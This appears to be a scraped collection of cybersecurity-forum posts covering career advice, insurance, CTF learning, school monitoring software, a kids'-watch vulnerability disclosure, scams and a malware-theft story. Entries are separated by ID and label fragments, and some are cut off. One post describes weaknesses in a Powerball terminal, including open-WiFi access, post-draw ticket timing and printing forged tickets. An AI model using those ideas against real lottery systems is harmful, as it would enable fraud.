Could the difference between these two terms only be in the *intent* of the encoding/encrypting process? That is, if it's done as a means of transmission, that's encoding. If it's done to hide the meaning of the message, that's encryption.

What do you think? Is there a difference? If so, how do you make the distinction? Where do you draw the line?",1

Graduated with a BS in comp sci a few years back, with a focus in SW engineering. Could solidly handle C++ and Java. Parallel to my college studies, I was in the military part time doing IT windows helpdesk type work.  Anyway... after searching for SW dev work for over a stressful half a year post graduation, I connect with a retired military guy and he refered me to a technical position on his ""information assurance"" team at his company. I felt no where near qualified (as it was outlined in the description) though I did have SEC+, a degree and some exp in IT, but I got the job (at a price point that looked amazing to me at the time) and hit the ground running.

I learned a lot, picked up a tool specific certification, began learning about the earning potention of the Cyber/Information Security arena. I also learned that one should be compensated for the work one does and the figure should not heavily (nearly exclusively) related to the number of years of experience. Jim is a nuclear physisist who is 15 years my senior, but we both got hired to remove staples from packets of paper... We should be compensated nearly equally. I found out I'm making about 5k below what this company/type of work should offer, and 8-10k less if I'm comparing myself to my peers (tall the Jims). But it was my fault for not negotiating my pay when I recieved the initial offer. I was excited. and Overly greatful. This was the only job that I actually got an interview for. And it was gonna be my first real, full-time, salaried job...

Research Research Research. I planned to negotiate my salary during my annual performance and compensation review. And then one of my coworkers, with whom I'd become friends, applied for and became one of our leads and is now my supervisor. (Super happy for them!) Review time rolled around and though I was nervous I still planned to negotiate for more than the standard 3%. So I walk into the meeting room sit down They give thier required corporate shpiel and commends me on my hard work and with genuine elation filling thier body, slide a piece of paper over to me. I looks different than the compensation paperwork from the mid year review. It was a promotion. With a around 10% bump in salary. That was the 6k increase I wanted to ask for... I froze up and couldn't try to negotiate... I was greatful for the recognition and the increase in pay... But I would have been more greatful for *that* increase at my *current* grade... ...And now, here we are half a year since the promotion, still with a sour taste in my mouth, was offered a 2 year retention bonus equal to 2x the diff between what I make and what I should have asked for... But Again I failed to use the offer for the retention bonus as a means to negotiate. (retention bonus was likely because of the shitty turn over rate with all the older people going for better paying jobs). My frustration is having an intense desire to get rid of my student loan debt and car note, and coming to the realization I don't remember how to code and all the IT/Networking stuff is now super fuzzy.

I digress... I love this this line of work, but I was promised a super fun technical job.....Instead I do paperwork all day and occasionally audit event logs. The one techy guy on our team (the person I've been instructed to shadow for the past 12 months) is too smart and doesn't know how to dumb stuff down and gets frustrated teaching so avoids it at all cost. So I've been stuck doing my already established tasks... But he has finally come around.

**TL;DR:**

I do compliance checks and maintain mountains of documentation. I'm finally getting some training on vulnerability assessments. Have CompTIA Security+ certification (maintained since 2014) and am a Certified Splunk Power User. Getting my hands dirty with Nessus. I can make my way around a computer no problem, and I've been wanting to pick up programming again and fortify my IT knowlege. I'm stuggling with the lack of structure away from a lecture hall.

Goals: *have some more fun and make some more money (by moving up or moving on)*

* set up home lab
* learn python
* git gud at linux
* pursue another certification (even if I don't test for it I feel like it will help with the structure) but I don't know which one.

Ultimately I'd like to do penetration testing. What suggestions do you guys have?",1

953,"Confused about how much   Insurance I need for my business **About us:** 

I own a subscription website with about 200,000 active, paying users.  We also have 1,000,000+ accounts that are inactive - either free trial accounts or expired ones.  

We have high overhead and the price of our product is low (less than $10/year), so even though it's a lot of paying users... we're still just average, not-rich people working for a small business.  

We have 10 in-house employees, 2 of which are developers.  Nobody is a   expert, but we are doing our best - and we're looking to buy cyber security insurance.

Our passwords are encrypted.  We don't collect banking information, store credit card information, health information, social security numbers, or anything like that.  We have nothing super confidential.

We don't use auto-renewal or store credit card info.  Our servers are on Rackspace.

**What we collect when someone signs up:**

- name (first and last)
- email
- state and/or country
- username (chosen by user)
- password (chosen by user; encrypted)

Users can voluntarily choose their job from a list, and they can also tell us their birth date and year, if they wish.

That's about it.

**What the insurance company salesman tells us:**

- A   breach costs $49 to $69 per user, on average.

**What I need to know:**

- How much coverage should I have?  

- 200,000 active users times $49 = 9.8 million dollars

- 1,200,000 total users (active + inactive) time $49 = 58.8 million dollars.

This seems.... high.  There's no way we can afford a 58 million dollar policy.  And a 9 million dollar policy would also costs tens of thousands too.  Not something we can afford.
 
 I want to take the insurance agency's numbers with a grain of salt.  I mean, I do want to be secure and protected, but they are trying to sell my insurance.  

Would it really cost $49 per user to ""fix"" a hack on our database?  Would the price in this stat be for a situation where credit monitoring were required?  Or for an small company like ours that doesn't have much information on users?

**Another Question:**

Let's say Company A has a website that collects full name, mailing address, phone number, e-mail, mother's maiden name, family member names, workplace name, type of car you drive, and a list of items in your fridge.

Company B's website just collects full name, email, username, and encrypted password.

If both databases are hacked, will both companies pay the same amount to ""fix"" the situation?

____________

I was thinking more like a 1 million or 2 million dollar policy.  Would this be enough?

For context:  

$1 million would cost $1,800 per year for 200k users.  (We can afford that.)

$2 million for 200k users would cost $2,000 per year.  (Again, we can do that!)

$3 million for 200k users would cost $6,000 per year.  (We can afford it, but why did the number jump so much?)

But $10 million?  Or 58 million?  I can only imagine....

**Last question:**

Our database has 200,000 active, paying users.  We have over a million expired or free trial customers.  Should we delete all of these old customers from our database?  Is this a serious liability for us?

We do market to them via monthly email newsletter.  Sometimes they come back after an absence.  And if they do come back, their account is all set up for them.  

...but if this is putting our company in a position where we can't afford to protect our data, maybe we should delete some of these old accounts.

Thoughts?

957,"Pursuing a CISSP Certification With No Prior Knowledge Background/History:
- Bachelor of Science in Electrical Engineering
- Employed as Electrical Engineer - 7 years (Not Cyber related)
- C/C++ Certification and Microcontroller Programming (Atmel AVR)
- I have no background in Cyber Security, but I want to learn and I want to pursue as a future career.

I have transferred to the Cyber Security department at my company and they are willing to pay for me to take the CISSP exam. I would like to pursue this, but I am in the dark as to where to start. It appears to me, that the only requirement is passing the exam, which can be achieved by 1)studying from a book and 2) taking class (optional).

Based on having little experience, how well could I comprehend the reading material to pass the exam? From a lot of what I read, the exam seems difficult, and that appears to be coming from people who have been in the industry.

I was considering getting my CCNA and CCNP before pursuing the CISSP, as I believe it could give me some more hands on experience and help me build my knowledge base before jumping in. I can get work to pay for my CCNA and CCNP if I provide a good business case and justify it for supporting going after my CISSP. 

Does trying to receive my CCNA/CCNP before pursuing the CISSP make sense for someone like me? Or is it not worth it? Should I just start jumping in to the CISSP material? Any other advice? Thanks.",1

963,"Retiring from military very soon, looking for advice to start cyber security career Hello everyone. I have been through a lot of these pages as well as the ITCareerQuestions sub and other online sites trying to get a grasp on what I want to do when I leave service. I am being medically retired (nothing crazy, due to medication required to treat hypersomnia) after 11 years of service. I am 30 years old. I have held a TS/SCI clearance for the past 6 years (currently only a TS since I transferred out of my SCI job last year) and my background/specialty is in Physical and Communications Security/Crypto Management. Now, I know none of that has anything to do with cyber or even computers in general, however, I believe that my strict attention to detail and analytical skills, on top of the kicker of my Security Clearance can get my foot in the door as long as I devote my time to mastering my new craft by attaining certifications and a degree. I have a deep interest in the field and want to transition into it.

I should be out of service by this time next year. I am going to an orientation at University of Tampa this weekend to meet with an advisor for the   BS degree they offer. With my military experience, half of the degree is done already, so I think this is a good starting path.
I also have great resources to me as a veteran that give me free training for literally any IT certification you can name, provided by institutions such as Carnegie-Mellon, MIT, Georgia Tech, and many more. 

I know that was a winded backdrop, but here is my list of questions for everyone here:

1) What is the best route of out of the classroom training (i.e. Certifications)? Is there a good order to do them in?

2) Is it worth my while to even get a BS in  ? Could I save myself 2 years and get into the industry quicker?

3) As an outsider, I have no social contacts in the industry. What is a good way to meet and learn from people who do the job every day?

4) Finally, and probably more importantly, how do I choose the direction I want to go as far as my specialty in the industry or is it something that just comes to you during schooling/opportunities provided to you in the workplace?

I thank you for all your time, advice and input. I'm excited for this new chapter in my life and want to make sure I am as prepared as possible.",1

So recently I have been decompiling a program which is called Lanschool. The program is a remote administration tool which allows teachers to view the student's screen all viewed websites usernames and passwords including those for non school use such as Google accounts Facebook ect even when outside of school hours and regardless of location. It also provides remote access to the computers hardware such as the camera and microphone (when connected to the same WiFi) as well as the ability to open, block and privately message students. Certain teachers at my school (who shall remain unnamed for obvious reasons) have repeatedly boasted and one has even gone as far as to list all the websites that a student visited (who will also remain unnamed) and the times they where accessed to the entire class. I have also discovered various undocumented features such as remote file transfer (this allows a teacher to for example download a student's private photos without consent) as well as other various features that are a clear breach of privacy. To top it off the student often is not informed about Lanschool and its various features often not learning of this until informed by another student. What do you guys think of this?

1019,"How to start  ? The ultimate two path guide to information security. Before I begin - everything about this should be totally and completely ethical at it's core. I'm not saying this as any sort of legal coverage, or to not get somehow sued if any of you fuck up, this is genuinely how it should be. The idea here is **information security.** I'll say it again. **information security.** The whole point is to make the world a better place. **This isn't for your reckless amusement and shot at recognition with your friends.** **This is for the betterment of human civilisation. Use your knowledge to solve real-world issues.**

&amp;#x200B;

There's no singular all-determining path to ' ', as it comes from knowledge from all areas that eventually coalesce into a general intuition. Although this is true, there are still two common rapid learning paths to ' '. I'll try not to use too many technical terms.

&amp;#x200B;

The first is the simple, effortless and result-instant path. This involves watching youtube videos with green and black thumbnails with an occasional anonymous mask on top teaching you how to download well-known tools used by thousands daily - or in other words the 'Kali Linux Copy Pasterino Skidder'. You might do something slightly amusing and gain bit of recognition and self-esteem from your friends. Your hacks will be 'real', but anybody that knows anything would dislike you as they all know all you ever did was use a few premade tools. The communities for this sort of shallow result-oriented field include [r/HowToHack](  and probably s of now. A lot of them are filled with kids that pretend they know what they're dealing with.

&amp;#x200B;

The second option, however, is much more intensive, rewarding, and mentally demanding. It is also much more fun, if you find the right people to do it with. It involves learning everything from memory interaction with machine code to high level networking - all while you're trying to break into something. This is where Capture the Flag, or 'CTF'   comes into play, where you compete with other individuals/teams with the goal of exploiting a service for a string of text (the flag), which is then submitted for a set amount of points. It is essentially competitive  . Through CTF you learn literally everything there is about the digital world, in a rather intense but exciting way. Almost all the creators/finders of major exploits have dabbled in CTF in some way/form, and almost all of them have helped solve real-world issues. However, it does take a lot of work though, as CTF becomes much more difficult as you progress through harder challenges. Some require godlike mathematics to break encryption, and others require you to think like no one has before. If you are able to do well in a CTF competition, there is no doubt that you should be able to find exploits and create tools for yourself with relative ease. The CTF community is filled with smart people who can't give two shits about elitist mask wearing twitter hackers, instead they are genuine nerds that love screwing with machines. There's too much to explain, so I will post a few links below where you can begin your journey.

&amp;#x200B;

Remember - this stuff is not easy if you don't know much, so google everything, question everything, and sooner or later you'll be down the rabbit hole far enough to be enjoying yourself. CTF is real life and online, you will meet people, make new friends, and potentially find your future.

1061,"Son got removed from highschool ""cyber security"" course after exposing a poorly programmed reservation system Bit of a long story so I'll do it bullet point. 

- high school created new Cyber Security course and handpicked students to join it. My son was one of the first picked. Course teacher doesn't know much at all, and glosses over / ignores things that he doesn't understand

- high school given access to the local community college's VM server. In order to use it you must book a time slot for a VM using the server infrastructures built-in reservation system

- son exposed bad code within minutes and proceeds to write a script that makes him 30 reservations in a row. Tells teacher who basically just ignores it. 

- next day, son changes script and makes 400 reservations, all usable by him, but reservations made with fictitious names. Tells teacher who again doesn't seem to care. 

- teacher gets email from community college - ""tell your student to stop doing that"", and next thing we know he is being kicked from the course due to his ""morals and character.""

So I'm a little pissed off at this point. I told my son that he did take it too far - he should have stopped in between writing the script and running it - and then submit a report to his teacher and community college. 

But on the other hand, I know it was completely harmless and easily undone by community college with a couple clicks of a mouse. 

I told the principal I'm going to have a hard time supporting the school on this one. Meeting between him and teacher and parents next week. My opinion is that this is the kind of thing that the school should be rewarding and and providing guidance with, not admonishing and telling a kid they have poor character.

1213,"Things you should consider learning before trying to learn to hack **So you want to learn how to hack?** 

Well there's a few things you should learn how to do before learning to hack. Some of these may be obvious to some but its not to everybody.   is not something you can just learn to follow steps and practice like learning to play an instrument or learning to ice skate.   is a type of complex problem solving using multiple skill sets and advanced knowledge of psychology, security, networking, computer hardware, programming, debugging and math. There is no one single path to learn how to hack, Everybody does it differently and their own way. The following is a list of things you should be very familiar with before you even consider trying to start   as a hobby. You don't need to follow these in any particular order but they are all equally important so if there is anything you are not familiar with I suggest starting there. If anybody has something to add such as learning resources or additional advice feel free to post below and I will add it if I think it may help.

**How to use most popular operating systems**

Download a virtual machine of your choice and any of these operating systems you are not familiar with and try to use them as your main OS for like a week

**Windows**: These are the most basic to learn you will have to find your own way to get them ‚ò†

* XP
* 7
* 8
* 10

**Linux**: This is what is used by most hackers as it gives you the most control over your system. They are open source and 100% free.

* [Ubuntu]( 
* [Fedora]( 
* [Mint]( 
* [Debian]( 
* [Arch](  more advanced)

About Kali-Linux:
&gt; Kali is great when I think you have most of the above knowledge, you can then start running vulnerable VM's and seeing if you can compromise them.
&gt; 
&gt; Ubuntu I found great to start in because it's a much friendlier interface, and you can add tools and your own scripts to it as you learn about them. It saves being swamped by hundreds of tools on Kali that you won't know a thing about or how to use.

-[Philabrow]( 







**MacOSX**: Unix but over priced and all the features removed. Not really worth becoming extremely familiar with unless you already use it. It is important to at least know it well enough to use it without getting confused.



**How to build a computer from scratch**

If you don't know how  a computer even works how do you expect to learn to hack it

* [what you need to know before building your own computer]( 
* [How to Build a PC Step-by-step]( 

**How a computer thinks**

Programming:Pick a language (or 6)  and start learning. This is the most important of them all specifically debugging. This is what you will be doing most of the time.

* [C]( 
* [C++]( 
* [C#]( 
* [Java](  don't)
* [Python]( 
* [Javascript]( 
* [Visual Basic]( 
* [Assembly]( 


 [**Webdesign**]( 
* [HTML]( 
* [PHP]( 
* [PHP Security]( 
* [CSS]( 

* [SQL]( 

**How to manipulate people**

The weakest point in nearly all security systems are the users themselves. It takes almost nothing to convince somebody to just hand over their password to you.

* [Psychology extreme basics]( 
* [Social engineering]( 
* [More Social Engineering]( 





**How computers talk to eachother**

You need a good understanding of networking and network security to become a hacker. This is basically what your entire hobby is based on more or less.

* [CCNA]( 


**Bonus**

These are by no means required but will give you a huge jump start.

* [Arduino]( 
* [Raspberry Pi]( 

**Edit**: Please remember none of this is  , this is just tools and skills you should learn before taking on   as a new hobby.

&gt; It's great to have a list of tools, but it's not a list of things you can research and memorize then call yourself an infosec expert.
&gt; 
&gt; I think the more valuable advice is to pick something tech-related you're interested in - software, networks, etc - and to learn it really, really well. Not just how to use it, but how and why it works. Do some toy projects - write some tools if you're into coding, set up a network if you're into networking - and try to understand why you're doing each piece of what you're doing.
&gt; 
&gt; When you feel like you've mastered something (and we're talking months or years here, not overnight), find things it connects to, and start to learn those the same way. If you're into coding, start working on network coding, or reverse engineering, or assembly, or even exploit dev. If you're into networking, start looking at BGP, or firewalls, or forensic packet dumps, or whatever.
&gt; 
&gt; The tools listed above will be what you end up using, but your goal isn't the tools, it's the concepts. Don't lose sight of that.
&gt; 
&gt; **Security isn't something you should go into quickly, it's a prestige class - you master something else first, then learn security on top of it.**

1224,"I just pwned an iPhone app that was stealing data from my company's API We were looking in the app store recently and we found an app that almost exactly cloned our app:

[ 

I thought a little more about this and decided to sniff their traffic. Sure enough, they were making calls to our API!

&amp;#x200B;

**What we did wrong**

So back when the company was first starting out, a developer (in fact the one I replaced) had set up our API as raw HTTP. I noticed this and corrected it pretty soon after I started, but it turns out that I was too late, and they were able to gain access to our API without much difficulty at all. Once we switched over to SSL, the endpoints were actually unchanged, so this app kept using those endpoints with a small tweak. 

(A couple users have commented, that SSL won't mask the endpoints, but just make them more difficult.  My thought is that given the security rationale of ""making it that much harder than the next guy"" this could have been enough to discourage someone from casually sniffing our traffic, but it's definitely not effective as reliable API security)

&amp;#x200B;

**What they did wrong**

Now that we've taken corrective action and gotten our users rolled over to a new API version with additional security measures, I decided to take a look at the requests this app was sending us. It turns out that it was very easy to identify when this app was contacting our app, and how to serve alternate content to them.

I connected their app to a local server using a proxy which only allowed traffic through to my API, to avoid any crash reports etc, and decided to see what I could get away with in their app. It turns out... a lot:

\- They don't sanitize the data at all, letting me put raw text in any of their fields.

\- Putting two dots on top of each other in the exact same spot causes them to blink back and forth between each other.

\- Session cookies work, allowing me to create a series of ""pages"" for each time the user moves the map.

\- And finally, sending malformed JSON crashes the app, which we send intentionally after the last ""page"" is displayed

&amp;#x200B;

**Video**

Putting all of these together it gave me plenty of leeway to have some fun with this, and get potential users back at the same time:

[ 

I also threw in an easter egg for Reddit, just click one of the stylized ""‚Ñù"" characters on the first screen, and click ""View detail AQI"", followed by ""View more detail AQI"".

1242,"Wherecom kids watches are unsafe Hello.

I'm a programmer from Ukraine.

A month ago I bought Fixitime 3 smart-watch from Elary (actually [Wherecom company's product](  from China) for my kid who is about to enter the first primary grade. This watch is a device that allows to track kid's position, call him, chat with voice, get photos from his watch and so on. 

 

I just wanted him, my wife and me to be a little calmer during his first days at school. But since  I have some knowledge in mobile and web applications security I've decided to check whether this watch is safe to use.

I installed [Wherecom mobile app](  added my kid's watch to it and started to analyse internet  traffic from this app. It took me only half an hour to find a vulnerability and to add another kids watches to my app in terms of experiment.  

 

This security breach allowed me to track all their activities. I was able to get GPS coordinates of these kids, get all detailed information about them, such as name, gender, age, height, weight, birthday, grade, avatar, cell phone number and so on. 

 

Also I was able to do everything that their parents could do in their mobile applications, even secretly listen what is happening around the kid.

I can't publish all details about this vulnerability now as it affects security of great number of users (about 200 - 300K devices). 

Actually this is not the one security issue in Wherecom server, they even don't use HTTPS protocol, just only HTTP. Using  not encrypted HTTP protocol allows hackers to capture your internet traffic from such applications in case you use public wi-fi. 

As the security of my kid was also affected, I decided to send all vulnerability details to Wherecom support. Nearly a month has passed since, but the vulnerability is still open. Some breaches were fixed, but not the main one.

So I just want everyone who uses Wherecom devices to be aware that they are insecure and allow everyone to track your kid, secretly listen his talk, get photos from his watch, call him, etc.

1263,"You haven't been hacked and hackers (probably) don't have video of you watching porn. If you are one of the thousands of people who received an email claiming that some bad guy has hacked your computer and has video of you watching porn so you better send bitcoin, I have good news.  You most likely haven't been hacked.  This post is a (hopefully) easy to find answer to this situation.  So what's going on?

Over the last several years there have been a number of very large data breaches impacting credit agencies, hotel reservation systems and lots of others.  From these breaches, a common result is a large set of email addresses with a password that was used in the system compromised.  The bad guys have recently started sending the previously mentioned email to the addresses they have passwords for.  It's guess work, since they have no real way of knowing if the email address is active or who might be reading  it.  They send potentially millions of these messages hoping for only a few dozen to actually send bitcoin.  It can provide a very solid return on invested effort.

Of course, there's no guarantee you haven't actually had someone hack into your personal machine, install a RAT and watch you watch porn.  It's just very unlikely.  You'll find out if/when they follow up, since the in scam I'm referring to, we've never seen that happen.

If you get one of these emails, the advice isn't complicated.  First delete the email, you'll never want to reply.  Next, DO NOT send bitcoin.  Change all your passwords, even if they're already different from the one in the email.  Never use a password for more than one site unless you really don't care about those accounts.  If the only computer you use is at home, you can write your passwords on a piece of paper, just keep it out of sight and never let it leave the house.  Otherwise, a password manager is probably a better choice.  There's a large amount of not-quite-agreement in this area, about which approach is best. Also, there are lots of really good guides on better passwords, I'll leave that for the reader to chase down.  I like what XKCD has to say on the matter, but YMMV.

I generally advise changing the password for your primary email (the one you have password recovery emails sent to) first.  If I were a bad guy with access to a target's accounts, at the first sign of response, I'd seize that email account first by changing the password to lock the original owner out.  Then I can recover all the other accounts at my leisure.  I assume actual bad guys would do this.  It's quite unlikely (as mentioned) that the bad guys are actually in your accounts, but why take unnecessary risks?

Finally, who am I to provide this advice?  I'm currently the senior information security technologist at a large post-secondary institution somewhere in Canada.  I learned information warfare and op-sec in the Canadian Forces some time back.  This is the same advice we've been giving faculty and students.  As always, your decisions are yours, my advice is free and potentially worth exactly what you paid.

Disclaimer: I do not, at all, have a background in   (as will become painfully obvious) and am literally just poking at a pair of malicious batch files out of boredom.

----

Girlfriend got an e-mail with a pair of batch files in it. She's very special, so she ran them, said that ""a window came on and off"". Thought I'd take a look.

You can see the contents of the files here at  

Okay, we're poking at System32 right off the bat, so obviously these things are up to no good. After refamiliarizing myself with Windows batch syntax, I figured out that these...

1. Establish a sort of ghetto cipher string (as evidenced by how each alphanumeric character is included),
2. Build a second one by picking and choosing from said string using string substitution,
3. Echo the entire mess of gobbledygook.

You can't see them in the Pastebin, but I actually removed some `@echo off`s from the file, thinking it would keep it from closing - even tried `pause` at the end and running it with the `/k` flag in PowerShell. Alas, nothing would keep the stupid window open!

As mentioned above, I am absolutely not a hacker. I'm a wannabe programmer who knows a few scripting languages. That said, I'm fluent in Lua, so with some lazy help from Sublime Tools, I rebuilt the batch file as a Lua script to see what it was doing:

    -- Build the cipher.

You may have noticed the absurd amount of spam, bullshit low quality memes, and noobs asking for help to hack something. You may not realize that we remove and ban *way* more than what you see. I myself have handed out 50 bans in the past two days and removed at least a hundred posts (and I only went back 3 days). 

If you see something, say something. Or at least click the report button. Hell, send me a direct PM if you want so my app notifies me (modmail and modqueue are busy af).

NOTE THAT FOR THIS FIRST VERSION, ALL NON-ASCII CHARACTERS HAVE BEEN REMOVED
A more inclusive, and thus, more accurate list is in the works.

I'm relatively new to the field, so any criticism is welcomed.

These lists are for LAWFUL, ETHICAL AND EDUCATIONAL PURPOSES ONLY - learn from them!


**EDIT:**
I am aware of the following comments/critiques:

 * Duplicates - I fell for the old invisible newline between Windows/Linux, fixing as we speak for Rev 1.1
 * How big is it? 24 GB full. I'll include this and pair it down with Zipping in Rev 1.1 - this will be made more obvious
 * What is my methodology? I'll explain this on the Repo - there is a current task list there
 * How can I contribute? I'm working on that
 * Licensing? Figuring that out

This has really taken off and I am a little overwhelmed by all your comments, support, suggestions, and critiques. Thanks for noticing! I'm doing my best to get it up to snuff

ZDNet just ran an article commemorating the 30th anniversary of the Morris Worm: 

*  [The day computer security turned real: The Morris Worm turns 30]( 

The Morris Worm was national news when it happend, and is one of the events that shaped network security. While there were malicious programs before it such as logic bombs and computer viruses, those were largely a standalone phenomenon, and neither pervasive nor widespread since networked PCs were still comparatively rare at the time. The Morris Worm was both, affecting an estimated 10% of hosts attached to the nascent Internet in a matter of hours. And for being such a pandemic, it was also rapidly analyzed and cured, which is also very different from today, where decade-old pieces of malware like [Conficker](  are still floating around.

The worm predates my entry into the field by a year, but hearing around it on the nightly news and reading about it newspapers were things that lead me to become an information security practitioner.

By knowing your enemy, you can defeat your enemy.
In the USA, the most senior police officers, even long after their pension, are advising residents how to secure their homes better. They come to your house and tell you where your weak points are around the house. They can advise this because they KNOW their enemy, the criminal that wants to break into the house and his techniques.

Training your cyber skills means also keeping your   skills up to date. To do this, you need an environment to practice in, legally and safely.

For this purpose, I have made a list of websites you can visit and practice your cyber skills. Every site has a different angle on the whole thing, so I'll summarise in a couple of words it's specifics.

Some sites will offer you tutorials to help you, others will require you to find things on your own.

I will update the list regularly and add sites to this post so bookmark it to see the latest overview.

If you are missing a site not mentioned on the list, please comment and give me the link, I might add it to the list.

I live and grew up in Salt Lake City, Utah, so the first place it routed me to was ""fastest server"". . . in Bluffdale.

For people that don't know, Bluffdale is where the NSA data center is. Definitely the biggest data center in the country, probably in the world.

Bluffdale is a small little desert town in the middle of nowhere. If you ever drive through it on I-15 you'll see nothing but desert-valley. (you can't see NSA from the freeway).

It's an awful place that no sane person would ever want to live in. I suspect most contractors/intel employees live in Draper 10 min away.

Why the hell do they have servers there? out of all places in this state.

There's probably like 300 people there who don't work for the military/intel establishment. Only about 8,000 total. It's nothing. Out of all the places I could of been routed to it wasn't Salt Lake, Provo, Ogden, or even Brigham City or Price. It was fucking Bluffdale.

This is really suspicious, and it confirms my intuitions that Nord may be good to be true.

* What did you learn while in school (if you went to uni) to stand out to employers for an internship or for an entry level job?

* Where do most people starting off as pentesters usually falter.  What can we do better as newcomers into the job?

* What distinguishes your career from security enigneering and analyst roles?  

* Any personal advice you have to offer to those interested in your career?

* What would you have done differently to have a successful career?

* Where do you see yourself going in the next 5 years?

1638,"I have a lottery machine. Powerball. Working and sold at a auction by a bank that closed on the gas station. I've gotten it to talk to the internet. I've got the manual. I'm intercepting protocols, IPs and such. Who wants into the project to own one of these? From the information I have and my lab setup I know this:

- The numbers you pick, once you begin entering them (say a set of 5) opens a TCP connection with their central server, whose IP is statically mapped, and the connection does not time out until the numbers have been entered and sent, or the transaction cancelled. If you start entering, wait 10 min, and submit, the timestamp **is that of when the TCP connection was opened.** 

- It's likely one can submit or buy a number set after a drawing if the above holds true. 

- These machines are supposed to be on their own separate internet connection. Of 23 stores whom had open WiFi and a Powerball machine, I was able to identify and hit the control and SSH,Telnet ports on the box. From the local LAN. 

- Enter a number that has already been picked, and the console will return a Hex value that represents how many of that number have been sold elsewhere. 

- The confirmation codes are returned by the central server in plain text. Intercepting these codes proves easy. They are broken into segments that represent a hash of the sum of the number set. The date, store # and a segment that I haven't broken at the end. 

- The printer built into the machine can be manipulated to print ANYTHING you want. Even the winning ticket.... But the data wouldn't verify at their operations center. But knowing if a number is bought before, when and where, could allow one to collect and grab the winning code and print a ticket at a store you did buy one from. How to work around what that machine reported as your numbers and what the ticket you have represent (in terms of the # they use)... I don't know. 

Am trying to build a group of people to work this issue. Eventually reporting our findings either A) Public as fuk or B) For a bug bounty. 

I figure our fame and notoriety would be a better way to monetize this work vs. the more profitable and highly illegal alternative...

LETS DO THIS! 

EDIT #2: The drive has been checked for CC or other account info. None was found. Shaggy is doing another more intense reverse search of the drive using some tool he has. These machines are all cash at the stores... Doh! (We're idiots) But it's better we're safe than sorry. 

EDIT #3: We can't post anything until legal says we can... Sorry guys. But they know who I am, so I can't very well just ignore them. I should have an answer today (God willing). But they are lawyers. So Monday possibly. If the thread just goes away, then legal came back with bad bad news. 

EDIT #4: LOL Forgot they are monitoring the thread. YOU LAWYERS ARE SLOW. Just saying.

1647,"Got hacked and here is what I learned So I have this terrible habit of downloading pirated games through torrents to try them out and see how it runs on my rig and if I do like the game, I go ahead and buy it.

I've been busy for the last couple of months with travel, etc and didn't really download any pirated software or torrents. Last weekend I felt like trying out a strategy game called ""Steam Punk"" and I downloaded a torrent from PirateBay. It did have a few red flags like the size was just 400mb etc. Since it was a small indie game, I chose ignore the flags. Right after the setup was complete I realized I might have installed a virus. I didn't have any Anti-Virus installed other than the stock Win 1\`0 defender and it did not detect the virus.  Ads started playing on my computer and a million processes were running and it was impossible for me to end each process individually since they kept restarting . So, I downloaded avast and performed a full system scan and then a start up scan and it could not clean up the virus. ""Juris.exe"" was one of the main apps that was running which I believe is one of the virus.

Either way, after the failed attempt to clean up the computer, I decided to fresh install the windows and format all my drives. I used the Win 10 reset option to wipe clean everything. Since my Win 10 and my Microsoft Office is linked to my Microsoft Live account, I could retrieve those keys after the fresh install. I finally got rid of the virus and spent the whole Saturday reinstalling apps and stuff. I thought there were no consequences of the virus other than having to fresh install the operating system and I was wrong.

Yesterday, I realized my Bank of America checking account was short of $5000. When I looked up the recent transactions there were five $\`1000 Zelle transfers to some stranger's email address. I was quite surprised since I never got any notification email of the transfers or the stranger's email being added as a recipient. I called up the bank and after getting transferred to various departments, they finally shut down my account and launched a fraud investigation. They said they will get back to me with their investigation results in 10 days and meanwhile they made me open a new checking account and reset my online account ID and password.

So, after dealing with the bank, I started digging around to see why exactly the bank failed to notify me about the transfers or a recipient being added without me authorizing it and in addition to that, how exactly did the hacker know the answer to my secret question since BofA asks a secret question every time there is a login from a new computer. I started to suspect if some one used my phone or my computer to authorize those transfers. My ex-girlfried whom I dumped last week was my first suspect. I checked the Bank account sign in history and there were a bunch of Web logins into my account. Almost every hour. Looks like the hacker was trying to transfer money but since Zelle has a $1000 intra day transfer limit, they couldn't transfer more than $\`1000 a day. I rarely check my bank account on my computer  so clearly someone else had access to my account before BofA reset my ID and password. When I checked the account activity notifications in the BofA website, it mentioned that the bank did send notifications of recipient being added, an authorization code for the recipient to be added and five successful $\`1000 transfer emails. I go check my gmail account and couldn't find those emails either in the inbox or in the trash. I go check the sign in history of my google account and saw that my gmail was accessed using my computer but from a location about 120 miles from where I live, around the same time the last transfer was initiated. Google usually notifies me when a new device is used to sign in but in this case it didn't since google thought it was me who was accessing it from a ""known"" device. That's when I realized that during the interval between installing the virus and fresh installing the windows (about 6 hours), the hackers could gather my device signature/mac/ID as well as all my saved passwords (I use Chrome to save passwords and I linked my gmail to my chrome so that I can retrieve the saved passwords across all my android devices). They definitely did not access my accounts from my computer since it definitely was switched off around the time they last accessed my email and also the location was different.

So, I finally could connect all the dots.

* I downloaded and installed a virus through torrents.
* The hackers gathered all my device information (MAC ID/Device ID/Name) as well as my Chrome passwords while I ran virus scans and prepared to clean install my computer's operating system
* They could fool Google, Bank of America and bunch of other websites (including my 401k Vanguard and my TD Ameritrade margin account) by pretending to access them from my computer (""known"" device) but from a different IP using the stolen device information and the saved passwords.
* They added a Zelle email recipient to my Bank of America account and transferred max daily amount until the day I found out.
* Since they had access to my gmail, they could authorize the recipient as well as delete their activity notifications from email inbox and trash before I get an email notification on my phone.
* Bank of America is currently conducting a fraud investigation on those transfers but considering how the hack happened, I think my chances of recovering any of it are very slim. I say that because, according to Bank of America, the account was accessed using a ""known"" device and all the protocols were followed for adding a recipient, authorizing a recipient and to transfer the money. What they do not know is that hackers had access to my email as well. Sure, the IP may not be the same as mine, but since the device ID is mine, they can definitely conclude the investigation against my favor.

I have no hopes of recovering the money and I've already come to terms with it but just wanted y'all to be aware of how dangerous it can be if someone could get a hold of your device information and combine it with access to your saved passwords (or just your primary email). After this hack, I changed all my passwords, added 2 Factor Authentication when possible and no longer have any saved passwords nor have any device as a trusted device. This whole episode made me realize how vulnerable I was when my primary gmail account got compromised (especially since I have chrome saving passwords to my gmail account).

Since my saved passwords included my Netflix, Hulu, Spotify, and other subscriptions, I am pretty sure the hacker must have sold them on dark web.

**TLDR:** Downloaded a torrent and got virus instead. Hackers got my device information and my saved passwords including to my bank account and its linked gmail account. Hackers spoofed my device information and used my passwords to circumvent the ""new device login"" and added a Zelle recipient and authorized it using their access to my email and kept transferring the max daily amount. Since they had access to my email, they kept deleting those activity emails so that I never got any email notification on my phone.

**Lesson Learned:** No more torrents, No more saved passwords, no more ""trusted"" devices, have 2FA whenever possible.

